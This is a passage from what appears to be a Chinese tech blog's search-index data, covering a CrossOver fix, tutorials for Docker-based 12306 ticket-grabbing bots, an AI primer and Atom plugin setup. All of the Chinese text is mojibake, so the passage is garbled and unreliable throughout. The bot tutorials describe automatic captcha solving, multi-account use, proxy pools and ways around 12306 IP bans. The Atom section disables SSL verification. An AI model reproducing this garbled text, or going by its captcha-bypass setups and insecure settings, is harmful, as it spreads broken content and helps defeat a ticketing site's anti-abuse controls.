å’Œå¾®ä¿¡ç™»é™†è§£å†³æ–¹æ¡ˆ ä¼˜éº’éºŸ 16.04 å®‰è£… CrossOverï¼ŒQQ è¾“å…¥ä¸äº†ä¸­æ–‡ åœ¨ CrossOver å®¹å™¨å®‰è£…å°å°è¾“å…¥æ³•è§£å†³æ— æ³•è¾“å…¥ä¸­æ–‡çš„é—®é¢˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"12306 æŠ¢ç¥¨è½¯ä»¶çš„å®‰è£…ä¸ä½¿ç”¨",url:"/posts/8980c415.html",text:'å‰è¨€ æœ¬æ•™ç¨‹ä¸»è¦ä»‹ç»å¦‚ä½•é€šè¿‡ Docker å®‰è£…å’Œä½¿ç”¨ TesterSunshine/12306 æŠ¢ç¥¨è½¯ä»¶ï¼Œå¹¶é…åˆä½¿ç”¨æœ¬åœ°çš„æ‰“ç æœåŠ¡ã€‚ TesterSunshine/12306 æŠ¢ç¥¨è½¯ä»¶çš„åŠŸèƒ½ è‡ªåŠ¨æ‰“ç  è‡ªåŠ¨ç™»å½• å‡†ç‚¹é¢„å”®å’Œæ¡æ¼ æ™ºèƒ½å€™è¡¥ é‚®ä»¶é€šçŸ¥ Server é…±é€šçŸ¥ Docker å’Œ Docker-Compose å®‰è£… ä¾èµ– Docker ç‰ˆæœ¬ä¸º 18.09 åŠä»¥ä¸Šï¼ŒDocker-Compose ç‰ˆæœ¬ä¸º 1.23.2 åŠä»¥ä¸Šï¼Œå…·ä½“å®‰è£…æ­¥éª¤å¯å‚è€ƒç«™å†…ä»¥ä¸‹æ•™ç¨‹ï¼š Docker å®‰è£…æ•™ç¨‹ Docker-Compose å®‰è£…æ•™ç¨‹ TesterSunshine/12306 æŠ¢ç¥¨è½¯ä»¶å®‰è£… 12345678910111213141516171819202122232425262728293031# æ‹‰å–æºç # git clone https://github.com/testerSunshine/12306.git# è¿›å…¥æºç çš„æ ¹ç›®å½•# cd 12306# ä¿®æ”¹é…ç½®æ–‡ä»¶é‡Œçš„è´¦å·ã€å‡ºå‘åŸå¸‚ã€åˆ°è¾¾åŸå¸‚ã€æŠ¢ç¥¨é€šçŸ¥ç­‰ä¿¡æ¯ï¼ˆåŸé…ç½®æ–‡ä»¶é‡Œæœ‰è¯¦ç»†çš„é…ç½®ä»‹ç»ï¼Œæ ¹æ®æ³¨é‡Šæç¤ºè¿›è¡Œé…ç½®å³å¯ï¼‰ï¼Œè‹¥ä½¿ç”¨ä½¿ç”¨æœ¬åœ°çš„æ‰“ç æœåŠ¡ï¼Œå¿…é¡»ä¿®æ”¹AUTO_CODE_TYPEä¸º3ï¼ŒHOSTæ”¹ä¸º"captcha:80"# vim TickerConfig.py# æ‹‰å–æ‰“ç æœåŠ¡çš„Dockeré•œåƒ# docker-compose pull captcha# æ„å»ºæŠ¢ç¥¨æœåŠ¡çš„Dockeré•œåƒ# docker-compose build ticket# æç¤ºï¼šè‹¥æ‹‰å–æˆ–è€…æ„å»ºDockeré•œåƒè€—æ—¶è¿‡é•¿ï¼ˆç½‘ç»œä¸‹è½½æ…¢ï¼‰ï¼Œæ­¤æ—¶å»ºè®®é…ç½®Dockerä½¿ç”¨ä»£ç†æˆ–è€…æ›´æ¢Dockerçš„é•œåƒæº# åˆ›å»ºå¹¶å¯åŠ¨æ‰“ç æœåŠ¡å’ŒæŠ¢ç¥¨æœåŠ¡çš„Dockerå®¹å™¨ï¼ˆå‘½ä»¤æ‰§è¡ŒæˆåŠŸåä¼šè‡ªåŠ¨å¼€å§‹æŠ¢ç¥¨ï¼‰# docker-compose up -d# æŸ¥çœ‹å®¹å™¨çš„çŠ¶æ€# docker-compose ps# æŸ¥çœ‹æŠ¢ç¥¨æœåŠ¡çš„æ—¥å¿—ä¿¡æ¯# docker logs --follow ticket æˆ–è€… docker logs --follow ticket --tail 10# åœæ­¢æŠ¢ç¥¨# docker-compose stop# å¼€å§‹æŠ¢ç¥¨# docker-compose start å½“ TickerConfig.py é…ç½®æ–‡ä»¶è¢«æ›´æ”¹åï¼Œéœ€è¦é‡æ–°æ„å»ºæŠ¢ç¥¨æœåŠ¡çš„ Docker é•œåƒï¼Œå¦åˆ™é…ç½®æ–‡ä»¶çš„æ›´æ”¹ä¸ä¼šç”Ÿæ•ˆï¼Œæ­¤æ—¶å¯æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š 1234567891011# è¿›å…¥æºç çš„æ ¹ç›®å½•# cd 12306# å…³é—­å¹¶é”€æ¯å®¹å™¨# docker-compose down# é‡æ–°æ„å»ºæŠ¢ç¥¨æœåŠ¡çš„Dockeré•œåƒ# docker-compose build ticket# åˆ›å»ºå¹¶å¯åŠ¨æ‰“ç æœåŠ¡å’ŒæŠ¢ç¥¨æœåŠ¡çš„Dockerå®¹å™¨ï¼ˆæ‰§è¡ŒæˆåŠŸåä¼šè‡ªåŠ¨å¼€å§‹æŠ¢ç¥¨ï¼‰# docker-compose up -d æŠ¢ç¥¨æˆåŠŸçš„æ—¥å¿—ä¿¡æ¯ 123456789101112131415æ­£åœ¨ç¬¬355æ¬¡æŸ¥è¯¢ ä¹˜è½¦æ—¥æœŸ: 2018-02-12 è½¦æ¬¡G4741,G2365,G1371,G1377,G1329 æŸ¥è¯¢æ— ç¥¨ ä»£ç†è®¾ç½® æ—  æ€»è€—æ—¶429msè½¦æ¬¡: G4741 å§‹å‘è½¦ç«™: ä¸Šæµ· ç»ˆç‚¹ç«™: é‚µé˜³ äºŒç­‰åº§:æœ‰æ­£åœ¨å°è¯•æäº¤è®¢ç¥¨...å°è¯•æäº¤è®¢å•...å‡ºç¥¨æˆåŠŸæ’é˜ŸæˆåŠŸ, å½“å‰ä½™ç¥¨è¿˜å‰©ä½™: 359 å¼ æ­£åœ¨ä½¿ç”¨è‡ªåŠ¨è¯†åˆ«éªŒè¯ç åŠŸèƒ½éªŒè¯ç é€šè¿‡,æ­£åœ¨æäº¤è®¢å•æäº¤è®¢å•æˆåŠŸï¼æ’é˜Ÿç­‰å¾…æ—¶é—´é¢„è®¡è¿˜å‰© -12 msæ’é˜Ÿç­‰å¾…æ—¶é—´é¢„è®¡è¿˜å‰© -6 msæ’é˜Ÿç­‰å¾…æ—¶é—´é¢„è®¡è¿˜å‰© -7 msæ’é˜Ÿç­‰å¾…æ—¶é—´é¢„è®¡è¿˜å‰© -4 msæ’é˜Ÿç­‰å¾…æ—¶é—´é¢„è®¡è¿˜å‰© -4 msæ­å–œæ‚¨è®¢ç¥¨æˆåŠŸï¼Œè®¢å•å·ä¸ºï¼šEB52743573, è¯·ç«‹å³æ‰“å¼€æµè§ˆå™¨ç™»å½•12306ï¼Œè®¿é—®â€˜æœªå®Œæˆè®¢å•â€™ï¼Œåœ¨30åˆ†é’Ÿå†…å®Œæˆæ”¯ä»˜ï¼ å…³äº IP è¢«å±è”½ è‹¥å‡ºç°ä¸‹è½½éªŒè¯ç è¿‡æœŸæˆ–è€…ä¸‹è½½éªŒè¯ç å¤±è´¥çš„é—®é¢˜ï¼Œæ­¤æ—¶åº”è¯¥æ˜¯è§¦å‘äº† 12306 å° IP çš„ç­–ç•¥ï¼Œå»ºè®®å¤šé‡è¯•å‡ æ¬¡ã€‚12306 ç°åœ¨å°æœåŠ¡å™¨ï¼ˆé˜¿é‡Œäº‘å’Œè…¾è®¯äº‘ï¼‰IP æ¯”è¾ƒä¸¥é‡ï¼Œå°½é‡ä¸è¦åœ¨æœåŠ¡å™¨ç¯å¢ƒä¸‹è¿è¡Œã€‚ æœ€åæ›´æ–° 2020 å¹´æ˜¥èŠ‚å‰åï¼Œä½¿ç”¨è¯¥æŠ¢ç¥¨ç¨‹åºæˆåŠŸå¸®æœ‹å‹æŠ¢åˆ° 7 å¼ é«˜é“ç¥¨ï¼Œè¿è¡Œç¯å¢ƒæ˜¯å•å° Vultr ä½é…æœåŠ¡å™¨ï¼ˆå›½å¤–ï¼‰å’Œå®¶ç”¨ PC æœºï¼ˆå›½å†…ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"ä¸€æ¬¾å¸¦ Web ç®¡ç†ç•Œé¢çš„ 12306 æŠ¢ç¥¨è½¯ä»¶",url:"/posts/94aa8dbb.html",text:'å‰è¨€ æœ¬æ–‡ä¸»è¦ä»‹ç» Py12306 æŠ¢ç¥¨è½¯ä»¶çš„æ‰‹åŠ¨å®‰è£…å’Œ Docker å®‰è£…è¿‡ç¨‹ï¼Œé€‚ç”¨äº Centos/Debian/Ubuntuï¼Œç›®å‰ä¸»æµå¼€æºçš„ 12306 æŠ¢ç¥¨è½¯ä»¶æœ‰ï¼štesterSunshine/12306ã€pjialin/py12306ã€‚ Py12306 æŠ¢ç¥¨åŠŸèƒ½ä»‹ç» å¤šæ—¥æœŸæŸ¥è¯¢ä½™ç¥¨ è‡ªåŠ¨æ‰“ç ä¸‹å• ç”¨æˆ·çŠ¶æ€æ¢å¤ ç”µè¯è¯­éŸ³é€šçŸ¥ å¤šè´¦å·ã€å¤šä»»åŠ¡ã€å¤šçº¿ç¨‹æ”¯æŒ å•ä¸ªä»»åŠ¡å¤šç«™ç‚¹æŸ¥è¯¢ åˆ†å¸ƒå¼è¿è¡Œ Docker æ”¯æŒ åŠ¨æ€ä¿®æ”¹é…ç½®æ–‡ä»¶ é‚®ä»¶é€šçŸ¥ Web ç®¡ç†é¡µé¢ å¾®ä¿¡æ¶ˆæ¯é€šçŸ¥ ä»£ç†æ± æ”¯æŒ (pyproxy-async) Python3.6 å®‰è£… Py12306 éœ€è¦è¿è¡Œåœ¨ Python 3.6 ä»¥ä¸Šç‰ˆæœ¬ã€‚ 12345678910111213141516171819202122232425262728293031323334# å®‰è£…ä¾èµ–ï¼ˆUbuntuï¼‰ï¼Œç”±äºUbuntu16+è‡ªå¸¦Python3ï¼Œåªéœ€è¦å®‰è£…pip3å³å¯ï¼Œæ— éœ€å†æ‰§è¡Œä¸‹é¢é€šè¿‡æºç ç¼–è¯‘å®‰è£…Python3çš„æ“ä½œ# apt install -y python3-pip# å®‰è£…ä¾èµ–ï¼ˆDebianï¼‰# apt-get update -y# apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev# å®‰è£…ä¾èµ–ï¼ˆCentosï¼‰# yum groupinstall -y "Development tools"# yum install -y sqlite-devel ncurses-devel ncurses-libs zlib-devel mysql-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel openssl-devel bzip2-devel expat-devel# ä¸‹è½½Python3.6.5æºç # wget https://www.python.org/ftp/python/3.6.5/Python-3.6.5.tgz# è§£å‹æºç # tar -xvf Python-3.6.5.tgz# è¿›å…¥è§£å‹åçš„ç›®å½•# cd Python-3.6.5# é¢„é…ç½®ï¼Œå¹¶æŒ‡å®šå®‰è£…è·¯å¾„# ./configure --prefix=/usr/local/python3.6.5# ç¼–è¯‘å®‰è£…# make# make install# åˆ›å»ºè½¯é“¾æ¥# ln -s /usr/local/python3.6.5/bin/pip3.6 /usr/bin/pip3.6# ln -s /usr/local/python3.6.5/bin/python3.6 /usr/bin/python3.6# åˆ é™¤æ–‡ä»¶å’Œç›®å½•# rm -rf Python-3.6.5# rm -f Python-3.6.5.tgz æ‰‹åŠ¨å®‰è£… Py12306 123456789101112131415161718192021222324252627282930313233# å…‹éš†æºç # git clone https://github.com/pjialin/py12306# è¿›å…¥æºç ç›®å½•# cd py12306# å®‰è£…ä¾èµ–# pip3.6 install -r requirements.txt# æ‹·è´é…ç½®æ–‡ä»¶# cp env.py.example env.py# æ›´æ”¹é…ç½®æ–‡ä»¶å†…å®¹ï¼ˆåŸé…ç½®æ–‡ä»¶é‡Œæœ‰è¯¦ç»†çš„é…ç½®ä»‹ç»ï¼Œæ ¹æ®æ³¨é‡Šæç¤ºè¿›è¡Œé…ç½®å³å¯ï¼‰# vim env.py# å¯åŠ¨å‰æµ‹è¯•ï¼ˆåŒ…æ‹¬ç”¨æˆ·è´¦å·æ£€æµ‹ï¼Œä¹˜å®¢ä¿¡æ¯æ£€æµ‹ï¼Œè½¦ç«™æ£€æµ‹ï¼‰# python3.6 main.py -t# é»˜è®¤ä¸ä¼šè¿›è¡Œé€šçŸ¥æµ‹è¯•ï¼Œå¦‚æœè¦å¯¹é€šçŸ¥è¿›è¡Œæµ‹è¯•éœ€è¦åŠ ä¸Š -n å‚æ•°ï¼Œå…¶ä»–å‚æ•°åŒ…æ‹¬ -c æŒ‡å®šè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ä½ç½®# python3.6 main.py -t -n# å‰å°è¿è¡Œç¨‹åº# python3.6 main.py# åå°è¿è¡Œç¨‹åºï¼ˆå»ºè®®ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¼€å¯æ—¥å¿—æ–‡ä»¶çš„è®°å½•ï¼Œæ—¥å¿—æ–‡ä»¶é»˜è®¤è·¯å¾„æ˜¯ï¼šruntime/12306.logï¼‰# nohup python3.6 main.py &amp;# åå°è¿è¡Œç¨‹åºçš„æƒ…å†µä¸‹ï¼ŒæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼ˆå‰ææ˜¯å·²å¼€å¯æ—¥å¿—æ–‡ä»¶çš„è®°å½•ï¼‰# tail -f runtime/12306.log# åº”ç”¨æˆåŠŸè¿è¡Œåï¼Œæœ¬åœ°æµè§ˆå™¨è®¿é—®http://localhost:8008ï¼Œå³å¯æ‰“å¼€Webç®¡ç†ç•Œé¢ï¼Œå¦‚éœ€å¤–ç½‘è®¿é—®Webç®¡ç†ç•Œé¢ï¼Œéœ€è¦æ‰“å¼€é˜²ç«å¢™ç«¯å£8008# firewall-cmd --zone=public --add-port=8008/tcp --permanent# firewall-cmd --reload (adsbygoogle = window.adsbygoogle || []).push({}); Docker å®‰è£… Py12306 123456789101112131415161718192021222324252627# æ–°å»ºæ–‡ä»¶å¤¹å­˜æ”¾é…ç½®æ–‡ä»¶# mkdir py12306# è¿›å…¥æ–°å»ºçš„æ–‡ä»¶å¤¹# cd py12306# åˆ›å»ºæ•°æ®ç›®å½•# mkdir data# ä¸‹è½½é…ç½®æ–‡ä»¶# docker run --rm pjialin/py12306 cat /config/env.py &gt; env.py# æˆ–è€…# curl https://github.com/pjialin/py12306/blob/master/env.docker.py.example -o env.py# æ›´æ”¹é…ç½®æ–‡ä»¶å†…å®¹ï¼ˆåŸé…ç½®æ–‡ä»¶é‡Œæœ‰è¯¦ç»†çš„é…ç½®ä»‹ç»ï¼Œæ ¹æ®æ³¨é‡Šæç¤ºè¿›è¡Œé…ç½®å³å¯ï¼‰# vim env.py# å¯åŠ¨å®¹å™¨ï¼ˆè¯¥å‘½ä»¤å¿…é¡»åœ¨py12306æ–‡ä»¶å¤¹å†…æ‰§è¡Œï¼‰# docker run -d --name py12306 -p 8008:8008 -v $(pwd):/config -v data:/data pjialin/py12306# å®¹å™¨æˆåŠŸå¯åŠ¨åï¼Œå½“å‰ç›®å½•ä¸‹ä¼šå¤šäº†ä¸€ä¸ª12306.logæ—¥å¿—æ–‡ä»¶# tail -f 12306.log# æœ¬åœ°æµè§ˆå™¨è®¿é—®http://localhost:8008ï¼Œå³å¯æ‰“å¼€Webç®¡ç†ç•Œé¢ï¼Œå¦‚éœ€å¤–ç½‘è®¿é—®Webç®¡ç†ç•Œé¢ï¼Œéœ€è¦æ‰“å¼€é˜²ç«å¢™ç«¯å£8008# firewall-cmd --zone=public --add-port=8008/tcp --permanent# firewall-cmd --reload Docker-Compose ä¸­ä½¿ç”¨ Py12306 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# æ–°å»ºæ–‡ä»¶å¤¹å­˜æ”¾é…ç½®æ–‡ä»¶# mkdir /usr/local/py12306# è¿›å…¥æ–°å»ºçš„æ–‡ä»¶å¤¹# cd /usr/local/py12306# ä¸‹è½½py12306é…ç½®æ–‡ä»¶# docker run --rm pjialin/py12306 cat /config/env.py &gt; env.py# æˆ–è€…# curl https://github.com/pjialin/py12306/blob/master/env.docker.py.example -o env.py# æ›´æ”¹py12306é…ç½®æ–‡ä»¶çš„å†…å®¹ï¼ˆåŸé…ç½®æ–‡ä»¶é‡Œæœ‰è¯¦ç»†çš„é…ç½®ä»‹ç»ï¼Œæ ¹æ®æ³¨é‡Šæç¤ºè¿›è¡Œé…ç½®å³å¯ï¼‰# vim env.py# åˆ›å»ºdocker-composeé…ç½®æ–‡ä»¶# touch docker-compose.yml# æ–°å¢ä»¥ä¸‹å†…å®¹åˆ°docker-composeé…ç½®æ–‡ä»¶ä¸­# vim docker-compose.ymlversion: "3.5"services: redis: image: pjialin/py12306 container_name: py12306 restart: always privileged: false ports: - 8008:8008 volumes: - \'/usr/local/py12306:/config\' - \'/usr/local/py12306/env.py:/config/env.py\' - \'/usr/local/py12306/runtime:/code/runtime\'# å¯åŠ¨å®¹å™¨ï¼ˆå¿…é¡»åœ¨docker-compose.ymlé…ç½®æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹æ‰§è¡Œï¼‰# docker-compose up -d# å®¹å™¨æˆåŠŸå¯åŠ¨åçš„ç›®å½•ç»“æ„å¦‚ä¸‹# tree /usr/local/py12306â”œâ”€â”€ docker-compose.ymlâ”œâ”€â”€ 12306.logâ”œâ”€â”€ env.pyâ”œâ”€â”€ queryâ”‚&nbsp;&nbsp; â””â”€â”€ status.jsonâ”œâ”€â”€ runtimeâ””â”€â”€ user â””â”€â”€ xxxxxxx.cookie# é˜²ç«å¢™ç«¯å£çš„å¼€æ”¾å’ŒWebç®¡ç†ç•Œé¢çš„è®¿é—®ï¼Œå¯å‚è€ƒä¸Šé¢çš„ä»‹ç» å…³äº IP è¢«å±è”½ ç›®å‰æŸ¥è¯¢å’Œç™»å½•æ“ä½œæ˜¯åˆ†å¼€çš„ï¼ŒæŸ¥è¯¢æ˜¯ä¸ä¾èµ–ç”¨æˆ·æ˜¯å¦ç™»å½•ã€‚12306 ç°åœ¨å°æœåŠ¡å™¨ï¼ˆé˜¿é‡Œäº‘å’Œè…¾è®¯äº‘ï¼‰IP æ¯”è¾ƒä¸¥é‡ï¼Œå°½é‡ä¸è¦åœ¨æœåŠ¡å™¨ç¯å¢ƒä¸‹è¿è¡Œã€‚å…³äºåˆ†å¸ƒå¼é›†ç¾¤å’Œä»£ç†æ± çš„æ”¯æŒï¼Œæœ‰å…´è¶£çš„å¯ä»¥è®¿é—® Github è¿›ä¸€æ­¥å­¦ä¹ ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"äººå·¥æ™ºèƒ½å…¥é—¨ä»‹ç»",url:"/posts/d571deaa.html",text:'é¢„å¤‡èƒ½åŠ› è‹±è¯­èƒ½åŠ› åŸºç¡€æ•°å­¦èƒ½åŠ› ç†Ÿæ‚‰ä¸€é—¨ç¼–ç¨‹è¯­è¨€ ç†Ÿæ‚‰æ·±åº¦å­¦ä¹ æ¡†æ¶ 6 çº§æˆ–æ‰˜ç¦ 75 åˆ† å¤§å­¦æœŸé—´æ›¾å­¦ä¹ è¿‡å•å…ƒå¾®ç§¯åˆ†ã€å¤šå…ƒå¾®ç§¯åˆ†ã€çº¿æ€§ä»£æ•°ã€æ¦‚ç‡è®º Cã€C++ã€Javaã€Pythonã€MATLAB Tensorflowã€Pytorch äººå·¥æ™ºèƒ½ä¸‰å¤§æ–¹å‘ è‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰ è®¡ç®—æœºè§†è§‰ï¼ˆCVï¼‰ æ¨èç³»ç»Ÿã€è®¡ç®—å¹¿å‘Š ç®€ä»‹ ä¸»è¦ç”¨äºè§£å†³æ–‡æœ¬è‡ªåŠ¨åˆ†ç±»ã€æ–‡æœ¬é‡è¦ä¿¡æ¯è‡ªåŠ¨æå–ã€æ•°æ®æŒ–æ˜ã€æ–‡æœ¬è‡ªåŠ¨ç”Ÿæˆã€å¯¹è¯æœºå™¨äººã€çŸ¥è¯†å›¾è°±ç­‰é¢†åŸŸï¼Œç”¨ä»¥è§£å†³äººç±»å¯¹æ–‡æœ¬ä¿¡æ¯åˆ†æä¸ç†è§£çš„è‡ªåŠ¨åŒ– ä¸»è¦ç”¨äºè§£å†³äººç±»å¯¹å›¾å½¢ã€å›¾åƒã€è§†é¢‘ç­‰ä¿¡æ¯çš„è‡ªåŠ¨åŒ–å¤„ç†ï¼Œä¾‹å¦‚å›¾åƒæ™ºèƒ½å¤„ç†ä¸è¯†åˆ«ã€è§†é¢‘æ£€æµ‹ã€å›¾åƒè‡ªåŠ¨ç”Ÿæˆã€æ— äººé©¾é©¶ã€äººè„¸è¯†åˆ«ä¸æ£€æµ‹ç­‰ ä¸»è¦ç”¨äºè§£å†³ä»å¤§é‡æ•°æ®ä¸­è·å–æœ‰æ•ˆæ•°æ®ï¼Œä¾‹å¦‚ç”µå½±ã€å›¾ä¹¦æ¨èï¼Œå¼‚å¸¸ä¿¡æ¯æŒ–æ˜ï¼Œé‡è¦ç¾¤è½å‘ç°ï¼Œå…³ç³»ç½‘ç»œè®¡ç®—ç­‰ æŠ€æœ¯ æ¶‰åŠç»å…¸äººå·¥æ™ºèƒ½æ–¹æ³•ã€æœºå™¨å­¦ä¹ ã€æ·±åº¦å­¦ä¹ æ–¹æ³• æ¶‰åŠè®¡ç®—æœºè§†è§‰çš„æ·±åº¦å­¦ä¹ æ–¹æ³•ï¼Œå¹¶åŒ…æ‹¬é›†è®¡ç®—æœºå›¾å½¢å­¦ã€ç»å…¸è®¡ç®—æœºè§†è§‰ä¸­çš„é‡ç‚¹æ–¹æ³•ï¼ŒåŒæ—¶ä¹Ÿè¦†ç›–äº†åŸºäºå¯¹æŠ—ç”Ÿæˆç½‘ç»œï¼ˆGANï¼‰çš„å›¾åƒç”Ÿæˆæ–¹æ³• æ¶‰åŠç»å…¸çš„æœºå™¨å­¦ä¹ ã€æ·±åº¦å­¦ä¹ ã€ä»¥åŠæ¨èç³»ç»Ÿã€å¹¿å‘Šé¢„æµ‹ã€åæ¬ºè¯ˆè¯†åˆ«ã€æ™ºèƒ½è®¾è®¡ã€åˆ†å¸ƒå¼å’Œå¤§æ•°æ®å¤„ç† ä¸»æµæœºå™¨å­¦ä¹ æ¡†æ¶ å›½å†…å¤–ä¸‰å¤§ä¸»æµæœºå™¨å­¦ä¹ æ¡†æ¶åˆ†åˆ«æ˜¯ Tensorflowã€PyTorchã€PaddlePaddleï¼Œå…¶ä»–æ¡†æ¶è¿˜æœ‰ SINGAã€MXNetã€Kerasã€Horovodã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"Atom æ’ä»¶ç®¡ç†",url:"/posts/b2a15380.html",text:'Atom è§£å†³åœ¨çº¿å®‰è£…æˆ–æ›´æ–°æ’ä»¶æ…¢çš„é—®é¢˜ 1234567891011121314# æ–¹æ³•ä¸€ï¼ˆé…ç½®ä»£ç†ï¼Œæ¨èä½¿ç”¨ï¼‰# é…ç½®Atomä»£ç†$ vim ~/.atom/.apmrcstrict-ssl=falseproxy=http://127.0.0.1:8118http-proxy=http://127.0.0.1:8118https-proxy=http://127.0.0.1:8118# æ£€æŸ¥å®‰è£…ç¯å¢ƒ$ apm install --check# æ›´æ–°æ’ä»¶ï¼Œå¹¶æŸ¥çœ‹ä½¿ç”¨ä»£ç†åï¼ŒAPMå‘å‡ºçš„æ›´æ–°è¯·æ±‚æ˜¯å¦éƒ½ç»è¿‡äº†ä»£ç†$ apm update --verbose 1234567891011121314151617# æ–¹æ³•äºŒï¼ˆé…ç½®ä»“åº“æºï¼Œç”±äºAPMçš„ä¾èµ–å¾ˆå¤šå¹¶ä¸æ˜¯NPMçš„ï¼Œå› æ­¤å³ä½¿ä½¿ç”¨äº†æ·˜å®çš„NPMæºä¹Ÿä¸ä¸€å®šèƒ½è§£å†³ä¸‹è½½æ…¢çš„é—®é¢˜ï¼‰# é…ç½®APMçš„ä»“åº“æº$ vim ~/.atom/.apmrcregistry=https://registry.npm.taobao.org/# é…ç½®NPMçš„ä»“åº“æº$ npm -config set registry https://registry.npm.taobao.org# æ£€æŸ¥APMçš„å®‰è£…ç¯å¢ƒ$ apm install --check# æŸ¥çœ‹APMçš„é…ç½®$ apm config list# æ›´æ–°æ’ä»¶$ apm update --verbose Atom ç¦»çº¿å®‰è£…æ’ä»¶ 12345678910111213# è¿›å…¥Atomæ’ä»¶æ‰€åœ¨çš„æœ¬åœ°ç›®å½•$ cd ~/.atom/packages# åœ¨Atomçš„æ’ä»¶å®˜ç½‘ï¼ˆhttps://atom.io/packagesï¼‰ä¸Šæœç´¢æ’ä»¶ï¼Œè·å–å¯¹åº”æ’ä»¶çš„ä»£ç ä»“åº“Gitåœ°å€ï¼Œå¹¶å°†æºä»£ç å…‹éš†ä¸‹æ¥$ git clone https://github.com/platformio/platformio-atom-ide-terminal# è¿›å…¥æ’ä»¶çš„æºç ç›®å½•$ cd platformio-atom-ide-terminal# æ‰§è¡ŒNPMå®‰è£…æ“ä½œ$ npm install# é‡å¯Atomç¼–è¾‘å™¨ Atom æ’ä»¶ç®¡ç† 1234567891011# æŸ¥çœ‹æ‰€æœ‰å·²å®‰è£…çš„æ’ä»¶ï¼ˆåŒ…æ‹¬å®˜æ–¹æ’ä»¶å’Œç¤¾åŒºæ’ä»¶ï¼‰$ apm list# æŸ¥çœ‹Atomä»“åº“ä¸­æŸä¸ªæ’ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯$ apm show termination# å®‰è£…æŸä¸ªæ’ä»¶$ apm install termination# å¸è½½æŸä¸ªæ’ä»¶$ apm uninstall termination Atom çš„ Markdown æ’ä»¶ 123456789101112131415161718192021222324252627# PDFé¢„è§ˆ$ apm install pdf-view# Markdownç¼–å†™ä¼˜åŒ–$ apm install markdown-writer# Markdownä»£ç ç€è‰²ï¼Œæä¾›ä»£ç ç‰‡æ®µç”Ÿæˆ$ apm install language-markdown# å°†å‰ªè´´é¢æ¿ä¸­çš„å›¾ç‰‡å¤åˆ¶åˆ°æœ¬åœ°æ–‡ä»¶å¤¹$ apm install markdown-image-paste# Markdowné¢„è§ˆæ»šåŠ¨åŒæ­¥$ apm install markdown-scroll-sync# Markdownè¡¨æ ¼æ’å…¥$ apm install markdown-table-editor# Markdownå¯¼å‡ºPDF$ apm install markdown-themeable-pdf# Markdowné¢„è§ˆï¼ˆæ–¹æ¡ˆä¸€ï¼‰$ apm install markdown-preview-plus# Markdowné¢„è§ˆï¼ˆæ–¹æ¡ˆäºŒï¼‰ï¼Œæ¨èä½¿ç”¨$ apm install language-gfm-enhanced$ apm install markdown-preview-enhanced Atom çš„ Markdown å›¾åºŠæ’ä»¶ Atom ç¼–å†™ Markdown æ–‡ä»¶ï¼Œé€šè¿‡æ’ä»¶å°†å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›å›¾åºŠï¼Œå¯å‚è€ƒæœ¬ç«™æ•™ç¨‹ 1234567891011121314# å°†å‰ªè´´é¢æ¿ä¸­çš„å›¾ç‰‡ä¸Šä¼ 